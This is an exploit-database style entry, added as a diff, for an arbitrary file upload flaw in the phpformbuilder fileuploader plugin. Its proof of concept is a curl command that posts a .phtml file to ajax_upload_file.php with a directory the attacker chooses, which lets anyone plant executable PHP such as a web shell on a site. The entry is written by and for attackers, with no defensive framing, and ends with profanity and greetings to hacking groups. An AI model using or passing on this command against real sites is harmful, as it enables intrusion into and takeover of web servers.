@@ -1,0 +1,19 @@
+Exploit Title   : phpformbuilder file uploader
+Author          : L0c4lh34rtz - Khunerable
+Vendor Homepage : https://www.phpformbuilder.pro/
+Vendor Github   : -
+Date            : 24 April 2019
+Tested on       : Ubuntu 16.04.2 LTS ( BackBox ), Windows 7
+
+Proof Of Concept
+[-] Go to /fileuploader/default/php/ajax_upload_file.php
+[-] curl -vk site/dumpdir/plugins/fileuploader/default/php/ajax_upload_file.php -F "uploader-single-file=@file.phtml" -F "input_name=uploader-single-file" -F "upload_dir=whatever u want upload" -A google
+
+DORK :
+USE UR FUCKING BRAIN!
+
+--------------------------------------------------------------------------------------
+
+never stop use fucking brain.
+
+thnks : IndoXploit - Typical Idiot Security - Zerobyte.id
